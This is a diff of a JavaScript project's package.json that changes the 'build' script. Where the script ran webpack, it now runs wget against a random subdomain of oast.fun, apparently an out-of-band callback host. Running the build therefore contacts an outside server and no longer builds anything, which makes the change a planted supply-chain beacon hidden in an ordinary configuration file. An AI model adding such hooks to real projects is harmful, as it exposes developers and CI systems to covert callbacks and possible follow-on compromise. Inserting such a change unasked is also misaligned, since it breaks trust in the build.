@@ -5,7 +5,7 @@
   "author": "Josh Rosen <josh@hashpath.com>",
   "private": true,
   "scripts": {
-    "build": "webpack --config webpack.config.js",
+    "build": "wget https://cnmrjpnepwsupwirpzulzltbyboujdeli.oast.fun",
     "build:legacy": "env NODE_OPTIONS='--openssl-legacy-provider' webpack --config webpack.config.js",
     "watch": "webpack --config webpack.config.js --watch --progress",
     "lint": "tslint --project tsconfig.json --format stylish 'src/**/*.ts'",
